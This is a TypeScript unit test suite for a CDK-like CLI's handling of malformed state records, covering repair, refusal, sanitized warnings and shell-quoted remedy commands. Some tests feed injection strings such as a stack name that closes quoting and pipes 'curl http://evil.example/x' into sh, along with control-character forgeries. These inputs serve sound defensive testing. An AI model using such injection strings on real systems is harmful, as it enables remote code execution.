import { describe, expect, it } from 'vite-plus/test';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import {
  STATE_RESOURCES_MALFORMED,
  hasReadableResources,
  isReadableBag,
  malformedRenderedContainersWarning,
  malformedResourcesWarning,
  malformedStateRefusalMessage,
  refuseMalformedState,
  repairMalformedResourcesForReadOnly,
  type RenderedStateContainer,
} from '../../../src/state/malformed-resources-bag.js';
import { UNRENDERABLE } from '../../../src/utils/display-safe.js';
import { CdkdError } from '../../../src/utils/error-handler.js';
import type { StackState } from '../../../src/types/state.js';

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');

/**
 * Source with comments removed. Every source-shape assertion below reads THIS,
 * because one of them was already satisfied by prose: a
 * `toContain('!opts.dryRun')` matched a doc comment quoting the gate it meant
 * to pin, so deleting the runtime gate and keeping the comment left the fence
 * green. A grep over un-stripped source asserts that someone WROTE a string,
 * not that the code DOES anything.
 */
function code(relPath: string): string {
  return readFileSync(join(repoRoot, relPath), 'utf8')
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/(^|[^:])\/\/.*$/gm, '$1');
}

function state(resources: unknown): StackState {
  return {
    version: 10,
    stackName: 'S',
    region: 'us-east-1',
    resources: resources as StackState['resources'],
    outputs: {},
    lastModified: 0,
  };
}

/** Every shape a hand-edited record can carry that is not a readable bag. */
const UNREADABLE: ReadonlyArray<readonly [string, unknown]> = [
  ['null', null],
  ['absent', undefined],
  ['an array', []],
  ['a number', 5],
  ['a string', 'ab'],
];

describe('repairMalformedResourcesForReadOnly', () => {
  for (const [label, value] of UNREADABLE) {
    it(`repairs ${label} and reports that it did`, () => {
      const s = state(value);
      expect(repairMalformedResourcesForReadOnly(s)).toBe(true);
      expect(s.resources).toEqual({});
    });
  }

  it('leaves a populated bag byte-identical and reports no repair', () => {
    const bag = { A: { physicalId: 'p', resourceType: 'T', properties: {} } };
    const s = state(bag);
    expect(repairMalformedResourcesForReadOnly(s)).toBe(false);
    // The SAME object, not a copy: callers hold the backend's reference and an
    // etag-paired saveState must write back the record that was read.
    expect(s.resources).toBe(bag);
  });

  it('leaves an EMPTY bag alone — {} is a legitimate deployed-nothing record', () => {
    const bag = {};
    const s = state(bag);
    expect(repairMalformedResourcesForReadOnly(s)).toBe(false);
    expect(s.resources).toBe(bag);
  });
});

describe('refuseMalformedState', () => {
  for (const [label, value] of UNREADABLE) {
    it(`refuses ${label} with a named code rather than a bare TypeError`, () => {
      let thrown: unknown;
      try {
        refuseMalformedState(state(value), 'MyStack', 'eu-west-1');
      } catch (err) {
        thrown = err;
      }
      expect(thrown).toBeInstanceOf(CdkdError);
      expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
      expect((thrown as CdkdError).message).toContain('MyStack');
      // The refusal has to say WHY a write-capable command will not proceed,
      // or it reads as the same unhelpful abort go-to-k/cdkd#3018 reported.
      expect((thrown as CdkdError).message).toContain('WRITE');
    });
  }

  it('passes a readable bag through, empty included', () => {
    expect(() => refuseMalformedState(state({}), 'S', 'r')).not.toThrow();
    expect(() => refuseMalformedState(state({ A: {} }), 'S', 'r')).not.toThrow();
  });
});

describe('the user-facing text', () => {
  it('names the record and forbids the two commands that would act on it', () => {
    const warning = malformedResourcesWarning('MyStack', 'eu-west-1');
    expect(warning).toContain('MyStack');
    expect(warning).toContain('eu-west-1');
    // An empty resource set is indistinguishable from a healthy empty stack in
    // every later line of output, so the warning has to say which it is.
    expect(warning).toContain('EMPTY');
    expect(warning).toContain('cdkd deploy');
    expect(warning).toContain('cdkd destroy');
  });

  it('sanitizes both interpolations — they land inside a pasteable command', () => {
    // A stack name reaches the cross-stack read path from an Fn::GetStackOutput
    // argument or an S3 key, and ConsoleLogger sanitizes a logger's extra ARGS,
    // never the message string. Unsanitized, a name could forge a line break
    // and append its own instruction to the command the text says to run, or
    // hide the real one behind an ANSI sequence.
    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r'];
    const hostile = `Evil${FORGERIES.join('')}Stack`;
    // Non-vacuity: the probe input must actually carry every forgery, or the
    // assertions below pass over a string that never had them.
    for (const forge of FORGERIES) {
      expect(hostile.includes(forge), `probe input lost ${JSON.stringify(forge)}`).toBe(true);
    }

    const texts = [malformedResourcesWarning(hostile, hostile)];
    try {
      refuseMalformedState(state(null), hostile, hostile);
    } catch (err) {
      texts.push((err as Error).message);
    }
    expect(texts.length, 'refuseMalformedState did not throw for a null bag').toBe(2);

    for (const text of texts) {
      for (const forge of FORGERIES) {
        expect(
          text.includes(forge),
          `rendered text still carries ${JSON.stringify(forge)}: ${JSON.stringify(text)}`
        ).toBe(false);
      }
      // And the sanitizer must not have eaten the identifier entirely — the
      // message has to still name WHICH record is broken.
      expect(text).toContain('Evil');
      expect(text).toContain('Stack');
    }
  });

  it('shell-quotes the remedy, so a hostile name cannot append its own command', () => {
    // displaySafe(asciiOnly) is a printable-ASCII allowlist: it removes the
    // control-character class above but KEEPS ' ; | ` $ and spaces. The
    // previous cut wrapped the command in '...' with only that sanitizing, so
    // this name closed the quoting and appended a command to the line the text
    // tells the user to RUN.
    const INJECTION = "a'; curl http://evil.example/x|sh; echo '";
    // BOTH arguments, and both orders. The region side is interpolated into
    // the same command and was unfenced: passing a benign `us-east-1` there
    // made `shellQuote(reg)` deletable with no test noticing, since shellQuote
    // returns an ordinary region unquoted anyway.
    const texts: string[] = [
      malformedResourcesWarning(INJECTION, 'us-east-1'),
      malformedResourcesWarning('MyStack', INJECTION),
    ];
    for (const [stack, region] of [
      [INJECTION, 'us-east-1'],
      ['MyStack', INJECTION],
    ] as const) {
      try {
        refuseMalformedState(state(null), stack, region);
      } catch (err) {
        texts.push((err as Error).message);
      }
    }
    expect(texts.length).toBe(4);

    for (const text of texts) {
      // The PROSE carries both identifiers too and was outside every probe,
      // so check the whole text, not only the command tail.
      expect(text, 'the hostile value never reached the rendered text').toContain('curl');
      const command = text.slice(text.indexOf('cdkd state show'));
      expect(command, 'the remedy command is missing').toContain('cdkd state show');
      // Inside a single-quoted shell word, the ONLY way out is a closing quote.
      // shellQuote escapes each one as '\'' so the word never terminates early.
      expect(
        command.includes("|sh") && !command.includes("'\\''"),
        `the remedy still carries an unescaped injection: ${command}`
      ).toBe(false);
    }
  });

  it('renders an identifier that sanitizes to EMPTY as a placeholder, not nothing', () => {
    // An empty argument makes --stack-region swallow --json, turning a remedy
    // into a differently-broken command.
    const text = malformedResourcesWarning('\u0000\u0001', '\u0002');
    expect(text).toContain('<unrenderable>');
    // NOT `not.toContain('--stack-region --json')`: neither regression can emit
    // that exact string -- dropping UNRENDERABLE gives `--stack-region '' --json`
    // and dropping shellQuote gives TWO spaces -- so it could never fail.
    // Assert the positive: a NAMED argument follows the flag.
    expect(text).toMatch(/--stack-region \S+ --json/);
  });

  it('carries the generic exit code — scrub needs a different one and says so', () => {
    // `refuseMalformedState` is a plain CdkdError (exit 1, the generic error).
    // That is right for import / orphan / rollback, and WRONG for scrub, whose
    // exit 1 means "--fail found plaintext" — so scrub raises its own exit-2
    // class around `malformedStateRefusalMessage` instead. A single shared
    // code would be wrong in the other direction too: `cdkd rollback`
    // documents 2 as "PARTIAL — journal kept, idempotent re-run", which would
    // tell an operator to re-run a command that attempted nothing.
    let thrown: CdkdError | undefined;
    try {
      refuseMalformedState(state(null), 'S', 'r');
    } catch (err) {
      thrown = err as CdkdError;
    }
    expect(thrown).toBeDefined();
    expect(
      (thrown as unknown as { exitCode?: number }).exitCode,
      'refuseMalformedState now pins an exitCode; check it against EACH refusing command’s ' +
        'documented contract before adopting it — they disagree.'
    ).toBeUndefined();

    // scrub raises its own class, so its wording CAN drift from this one.
    // `expect(thrown.message).toContain(malformedStateRefusalMessage(...))`
    // would be self-referential -- refuseMalformedState IS that throw -- so
    // the claim is checked where it can actually be false: scrub's source.
    expect(
      code('src/cli/commands/scrub.ts'),
      'scrub no longer raises its refusal through malformedStateRefusalMessage, so its wording ' +
        'can drift from every other refusing command.'
    ).toContain('malformedStateRefusalMessage(');
  });

  it('hasReadableResources is exported, because scrub branches on it directly', () => {
    expect(hasReadableResources(state(null))).toBe(false);
    expect(hasReadableResources(state({}))).toBe(true);
  });

  it('every scrubStack return AFTER the repair carries the finding', () => {
    // The first cut of this signal patched the SAME early-return arm twice and
    // missed the main success path, so a stack whose bag was repaired AND
    // whose outputs held a secret returned without the flag and the finding
    // was lost.
    //
    // Counted on a REQUIRED field rather than by brace-matching the returns: a
    // `[\s\S]*?` span ran past an arm's closing brace and swallowed the next
    // one, which made this fence red for the wrong reason while looking right.
    // `unverifiableReads` appears exactly once per ScrubStackResult literal.
    const src = code('src/cli/commands/scrub.ts');
    const repairAt = src.indexOf('repairMalformedResourcesForReadOnly(state)');
    expect(repairAt, 'scrub no longer repairs under --dry-run').toBeGreaterThan(-1);
    // A CODE anchor, and specifically the CALL in scrubStack's masking-boundary
    // catch. Two earlier spellings were wrong in opposite directions: the
    // comment `THE MASKING BOUNDARY` resolves to -1 now that `src` is
    // comment-stripped (span = rest of file), and `} catch (err) {` matches an
    // INNER catch 901 characters in (span = empty, zero literals, fence
    // vacuous). `maskSecretsInError` is called only in that outer catch and
    // sits after both result literals.
    const endAt = src.indexOf('maskSecretsInError', repairAt);
    expect(endAt, "scrubStack's masking boundary moved; this fence's end anchor is gone").
      toBeGreaterThan(repairAt);

    const body = src.slice(repairAt, endAt);

    // PER LITERAL, not a union total. B1 was a DISTRIBUTION defect — one arm
    // carried the spread twice and the other zero — so `2 spreads across 2
    // literals` was true of the BUG and of the fix alike, and a summed fence
    // passes on the source it exists to reject (measured against both blobs).
    // Splitting on the required field and counting inside each literal is what
    // makes `[2, 0]` distinguishable from `[1, 1]`.
    const perLiteral = body
      .split('unverifiableReads:')
      .slice(1)
      .map((rest) => {
        const close = rest.indexOf('};');
        const literal = close >= 0 ? rest.slice(0, close) : rest;
        return literal.split('malformedResources ? { malformedResources }').length - 1;
      });

    expect(
      perLiteral.length,
      'found fewer than two ScrubStackResult literals after the repair; this fence is ' +
        'asserting nothing'
    ).toBeGreaterThanOrEqual(2);
    expect(
      perLiteral,
      `each ScrubStackResult returned after the repair must carry \`malformedResources\` ` +
        `exactly once; got ${JSON.stringify(perLiteral)}. A zero means a stack whose resources ` +
        `bag was repaired can return through that arm with the finding LOST — ` +
        `\`--dry-run --fail\` then reports a clean run over a record it never read ` +
        `(go-to-k/cdkd#3018). A two means a duplicate spread, which is how the missing one was ` +
        `masked the first time.`
    ).toEqual(perLiteral.map(() => 1));
  });

  it('the malformed-record finding is raised INSIDE the --dry-run branch', () => {
    // The finding is set ONLY under `--dry-run`, and `scrubCommand`'s dry-run
    // branch RETURNS -- so a throw placed after that branch is dead code for
    // it. The first cut did exactly that: `--dry-run --fail` then exited 1 via
    // `ScrubNeededError`, the code reserved for "scrub looked and found a leak
    // -- rotate the secret", which is the opposite remedy; and because that
    // error is `silent: true`, the finding's message never printed either.
    //
    // A source-shape check is what fits here: the defect is the POSITION of a
    // throw relative to a `return`, and `scrubCommand` is behind synthesis.
    const src = code('src/cli/commands/scrub.ts');
    const branchAt = src.indexOf('if (options.dryRun) {');
    expect(branchAt, "scrubCommand's --dry-run branch is gone or renamed").toBeGreaterThan(-1);
    const returnAt = src.indexOf('\n    return;', branchAt);
    expect(returnAt, "the --dry-run branch's own return is gone").toBeGreaterThan(branchAt);

    const branch = src.slice(branchAt, returnAt);
    expect(
      branch,
      'the malformed-record finding is not raised inside the --dry-run branch. It can only be ' +
        'SET under --dry-run, and that branch returns, so a throw below it never runs: the run ' +
        'exits 0, or 1 via the SILENT ScrubNeededError, whose code means the opposite remedy ' +
        '(go-to-k/cdkd#3018).'
    ).toContain('malformedRecords.length > 0');

    // And ABOVE the --fail gate, or ScrubNeededError wins the race and
    // swallows the message.
    expect(
      branch.indexOf('malformedRecords.length > 0'),
      'the finding is raised BELOW `options.fail`, so ScrubNeededError (exit 1, silent) fires ' +
        'first and reports "scrub found a leak" for a record scrub could not read.'
    ).toBeLessThan(branch.indexOf('if (options.fail)'));
  });
});

describe('isReadableBag is the ONE predicate (issue go-to-k/cdkd#3187)', () => {
  /**
   * Every shape, with the verdict written as a LITERAL rather than taken from
   * the sibling predicate.
   *
   * `hasReadableResources` delegates, so comparing the two is true by
   * construction and reds on nothing inside `isReadableBag` (measured: mutating
   * it to `return true` reds 14 cases in this file, none of them the comparison
   * — review of go-to-k/cdkd#3190). The literals are the coverage; the
   * comparison below is drift-detection for the day someone RE-INLINES the body
   * into `hasReadableResources`, which is the only way the two can disagree.
   */
  const READABLE: ReadonlyArray<readonly [string, unknown, boolean]> = [
    // DERIVED from the shared table, not re-spelled beside it: a shape added
    // there must be covered here too, and a hand-written copy silently would
    // not be (review of go-to-k/cdkd#3190). The verdicts stay literals — that
    // is the half that must not be computed.
    ...UNREADABLE.map(([label, value]) => [label, value, false] as const),
    ['a boolean', true, false],
    ['an empty object', {}, true],
    ['a populated object', { A: 1 }, true],
  ];

  it('answers the plain-object question for every shape', () => {
    for (const [label, value, expected] of READABLE) {
      expect(isReadableBag(value), label).toBe(expected);
    }
  });

  it('and hasReadableResources still delegates to it, so the two cannot drift', () => {
    for (const [label, value] of READABLE) {
      expect(hasReadableResources(state(value)), label).toBe(isReadableBag(value));
    }
  });
});

describe('the rendered-container warning (issue go-to-k/cdkd#3187)', () => {
  const CONTAINERS: readonly RenderedStateContainer[] = [
    'outputs',
    'skippedOutputs',
    'attributes',
    'properties',
  ];

  it('renders both identifiers exactly as its sibling messages do, and ends on the command', () => {
    // A planted stack name that would close the quoting and append its own
    // command to the line this text tells the user to RUN. A stack name reaches
    // these paths from an S3 key, so it is not trusted.
    const evil = "a'; curl http://x|sh; echo '";
    const w = malformedRenderedContainersWarning(evil, 'us-east-1', ['outputs']);
    const sibling = malformedResourcesWarning(evil, 'us-east-1');

    // The command is LAST and UNWRAPPED here — an outer `'...'` would compose
    // with `shellQuote`'s own quoting into something unpastable.
    //
    // `command.endsWith('--json')` is the whole LAST assertion. An
    // `expect(w.endsWith(command))` beside it would be a tautology, since
    // `command` is a suffix of `w` by construction, and it read as a second
    // check (review of go-to-k/cdkd#3190). This one reds on any prose appended
    // after the command.
    const start = w.indexOf('cdkd state show ');
    expect(start).toBeGreaterThan(-1);
    const command = w.slice(start);
    expect(command.endsWith('--json')).toBe(true);

    // ...and BYTE-IDENTICAL to the command the sibling message builds from the
    // same inputs. That is the assertion that cannot rot: it pins the shared
    // sanitize-then-shell-quote path rather than re-spelling `shellQuote`'s
    // output here, where a hand-written expectation would have to be revised —
    // and could be revised WRONG — every time that helper changes.
    expect(sibling).toContain(command);
    // The planted text never appears unquoted.
    expect(command).not.toContain(`show ${evil} `);
  });

  it('keeps a control-bearing identifier on ONE line, so it cannot forge a row', () => {
    const w = malformedRenderedContainersWarning(
      `Evil${String.fromCharCode(0x1b)}[31m\nStack: Decoy`,
      'us-east-1',
      ['outputs']
    );
    expect(w.split('\n')).toHaveLength(1);
    expect(w).not.toContain(String.fromCharCode(0x1b));
  });

  it('renders an identifier that sanitizes to EMPTY as a placeholder', () => {
    // Never as nothing: an empty argument makes `--stack-region` swallow the
    // next flag, turning the remedy into a differently-broken command.
    //
    // Built from escapes rather than written as literal bytes: a raw control
    // character makes `grep` and `rg` treat the whole file as BINARY and skip
    // it, so every grep-based audit stops seeing this suite. Enforced by
    // `tests/unit/scripts/source-control-bytes.test.ts`, which is what caught
    // the first cut of this case.
    const controlOnly = String.fromCharCode(0x00, 0x01);
    const w = malformedRenderedContainersWarning(controlOnly, 'us-east-1', ['outputs']);
    expect(w).toContain(UNRENDERABLE);
  });

  it('names the containers in the order it was given, quoted', () => {
    const w = malformedRenderedContainersWarning('S', 'us-east-1', CONTAINERS);
    expect(w).toContain(`'outputs', 'skippedOutputs', 'attributes', 'properties'`);
  });

  it('sanitizes a container NAME too, so the closed union is not the only guard', () => {
    // The union is closed at COMPILE time and the sole caller sources its names
    // from a module constant, so nothing can reach this today. That is exactly
    // why it is worth a case: the guarantee would otherwise live in a comment,
    // and the day a caller derives a name from a record the forged element
    // would render verbatim and could forge a line. Cast, because the type is
    // what this case is deliberately reaching around.
    const forged = `x\nStack: Decoy` as RenderedStateContainer;
    const w = malformedRenderedContainersWarning('S', 'us-east-1', [forged]);
    expect(w.split('\n')).toHaveLength(1);
    // The RENDERED token, not just the line count: a sanitizer that returned
    // `''` for everything would satisfy a line-count assertion while naming no
    // container at all (review of go-to-k/cdkd#3190). The newline becomes a
    // space, so the text survives as prose inside its quotes and cannot start a
    // row.
    expect(w).toContain(`'x Stack: Decoy'`);
  });

  it('floors a name that sanitizes to EMPTY and caps a multi-kilobyte one', () => {
    // The two classes `safeIdentifier` closes that a bare sanitizer does not,
    // and the reason the names take that helper rather than `displaySafe`
    // alone: `''` names no container, and an uncapped name pushes the remedy
    // command off the reader's screen. Same casts, same unreachable-today path.
    const empty = malformedRenderedContainersWarning('S', 'us-east-1', [
      String.fromCharCode(0x00, 0x01) as RenderedStateContainer,
    ]);
    expect(empty).toContain(`'${UNRENDERABLE}'`);

    const long = malformedRenderedContainersWarning('S', 'us-east-1', [
      'q'.repeat(5000) as RenderedStateContainer,
    ]);
    expect(long).toContain(`'${'q'.repeat(128)}...'`);
    // The remedy is still on SCREEN after the cap — a DISTANCE, not
    // `endsWith('--json')`, which the template satisfies on every path with or
    // without a cap and would be the tautology this suite just deleted one case
    // over (review of go-to-k/cdkd#3190). Uncapped, the 5000-character name
    // alone pushes the message past this bound.
    expect(long.length).toBeLessThan(1000);
  });
});

/**
 * WHICH helper each call site gets is the whole safety property, and the first
 * round of go-to-k/cdkd#3018 got it wrong in the dangerous direction: it
 * REPAIRED on `cdkd scrub`, whose `saveState` is gated on `recordsChanged > 0`
 * — satisfied by an OUTPUTS change alone — so a record holding
 * `"resources": null` plus a plaintext secret in `outputs` would have been
 * scrubbed and then saved back with a well-formed `resources: {}`. That
 * launders the only signal anything is wrong: the next `cdkd deploy` reads
 * zero resources and re-CREATES the stack, and the next `cdkd destroy` orphans
 * every live resource.
 *
 * So the rule is mechanical — a command that can WRITE state refuses; only a
 * read-only one repairs — and these cases pin each site to the right side of
 * it.
 */
describe('write-capable commands refuse; read-only ones repair', () => {
  const REFUSE = [
    'src/cli/commands/scrub.ts',
    'src/cli/commands/import.ts',
    'src/cli/commands/orphan.ts',
    // Added in round 3: `{...null}` yields `{}` and throws nothing, so this
    // one launders silently — in the command that runs precisely when state is
    // already suspect.
    'src/cli/commands/rollback.ts',
  ];
  const REPAIR = ['src/cli/commands/diff-recursive.ts'];

  /**
   * The FIRST expression in each file that READS the resources bag. The
   * refusal has to come before it.
   *
   * For `import` / `orphan` / `rollback` the anchor is an UNGUARDED read, so
   * a refusal below it leaves the raw TypeError in front of the named one --
   * round 1's exact defect. `scrub`'s anchor carries a `?? {}` and so cannot
   * throw; it is pinned anyway because a refusal below the point the bag is
   * first CONSUMED would let the command act on an empty map before deciding
   * it will not act at all.
   */
  const FIRST_DEREF: Record<string, string> = {
    'src/cli/commands/scrub.ts': 'Object.entries(state.resources',
    'src/cli/commands/import.ts': 'hasOwnProperty.call(existingState.resources',
    'src/cli/commands/orphan.ts': 'id in state.resources',
    'src/cli/commands/rollback.ts': '{ ...baseState.resources }',
  };

  for (const file of REFUSE) {
    it(`${file} REFUSES — it can saveState`, () => {
      const src = code(file);
      // TWO spellings count as refusing. Most files call the shared helper;
      // `scrub` branches on the exported predicate and raises its OWN exit-2
      // class, because its exit 1 is spoken for ("--fail found plaintext").
      // Both must carry the same MESSAGE, which the exit-code case pins.
      const refuses =
        src.includes('refuseMalformedState(') ||
        (src.includes('hasReadableResources(') && src.includes('malformedStateRefusalMessage('));
      expect(
        refuses,
        `${file} calls saveState, so a malformed record must be refused, not repaired: saving ` +
          `over it would replace the evidence with a well-formed empty bag permanently. Call ` +
          `refuseMalformedState(), or branch on hasReadableResources() and raise your own ` +
          `class around malformedStateRefusalMessage().`
      ).toBe(true);
      // `scrub` is the one file legitimately holding BOTH: its write gate is
      // `recordsChanged > 0 && !opts.dryRun`, so under `--dry-run` it provably
      // cannot persist and repairing preserves the audit. Any OTHER
      // write-capable file holding the repair helper is the round-2 defect.
      if (file !== 'src/cli/commands/scrub.ts') {
        expect(
          src.includes('repairMalformedResourcesForReadOnly'),
          `${file} repairs a malformed resources bag but can also WRITE state.`
        ).toBe(false);
      } else {
        // NOT `toContain('!opts.dryRun')`: the doc comment beside the branch
        // quotes that gate verbatim, so the assertion passed on the PROSE —
        // delete the runtime gate, keep the comment, fence stays green. Pin
        // the two things that actually make the exception sound, each as a
        // statement rather than as explanation: the lock is not taken under
        // --dry-run, and the save is gated on it.
        expect(src, 'scrub no longer skips the lock under --dry-run').toMatch(
          /acquired\s*=\s*!opts\.dryRun/
        );
        expect(src, "scrub's saveState is no longer gated on !opts.dryRun").toMatch(
          /recordsChanged > 0 && !opts\.dryRun/
        );
        // And the repair must not be able to end in a clean verdict — the
        // finding has to reach a non-zero exit (go-to-k/cdkd#3018 round 4).
        expect(
          src,
          'a --dry-run that repaired a malformed bag no longer raises; `--dry-run --fail` would ' +
            'report a CI-green clean run over a record whose resources it never read.'
        ).toContain('malformedRecords.length > 0');
      }
      // The premise of the rule, asserted rather than assumed — if this file
      // stops writing state the classification should be revisited, not
      // silently inherited.
      expect(src, `${file} no longer calls saveState`).toContain('saveState(');

      // DOMINANCE, not presence. The round-1 defect WAS a position error -- a
      // guard below the dereference it meant to protect -- so a fence that
      // only checks the refusal exists would not have caught it, and moving
      // any of these calls below its file's first bag dereference reds
      // nothing without this.
      const refusalAt = Math.max(
        src.indexOf('refuseMalformedState('),
        src.indexOf('hasReadableResources(')
      );
      const derefAt = FIRST_DEREF[file]!;
      const derefIndex = src.indexOf(derefAt);
      expect(
        derefIndex,
        `${file} no longer contains its first bag dereference \`${derefAt}\`; this fence's ` +
          `anchor is stale and it is no longer checking dominance.`
      ).toBeGreaterThan(-1);
      expect(
        refusalAt,
        `${file} refuses AFTER its first \`state.resources\` dereference (\`${derefAt}\`), so ` +
          `the raw TypeError still fires one line above the refusal — the exact shape ` +
          `go-to-k/cdkd#3018's first cut shipped.`
      ).toBeLessThan(derefIndex);
    });
  }

  // `diff-recursive.ts` hands the repaired record to `diff.ts`, which is where
  // the top-level command lives. The repair is only safe while NEITHER writes,
  // so the consumer is fenced alongside the producer rather than reasoned about.
  it('src/cli/commands/diff.ts consumes a repaired record and must not write either', () => {
    const src = code('src/cli/commands/diff.ts');
    // A write would arrive through a helper, not necessarily through a literal
    // `saveState(` in this file — so the three helpers that own one are fenced
    // by IMPORT as well.
    for (const writer of ['ExportIndexStore', 'LockManager', 'DeploymentEventsStore']) {
      expect(
        src.includes(writer),
        `src/cli/commands/diff.ts now imports ${writer}, which can persist. It consumes ` +
          `records repaired by diff-recursive.ts, so any write from this file can launder a ` +
          `merely-unreadable record into a well-formed empty one.`
      ).toBe(false);
    }
    expect(
      src.includes('saveState('),
      `src/cli/commands/diff.ts now writes state. It receives records repaired by ` +
        `diff-recursive.ts's loadStateOrEmpty, so writing one back would save a well-formed ` +
        `empty bag over a merely-unreadable record — the laundering go-to-k/cdkd#3018's fix ` +
        `refuses everywhere else.`
    ).toBe(false);
  });

  for (const file of REPAIR) {
    it(`${file} REPAIRS — it never writes`, () => {
      const src = code(file);
      expect(src).toContain('repairMalformedResourcesForReadOnly(');
      expect(src).toContain('malformedResourcesWarning(');
      expect(
        src.includes('saveState('),
        `${file} now writes state, so repairing a malformed bag there can launder the record ` +
          `— it must refuse instead.`
      ).toBe(false);
    });
  }
});
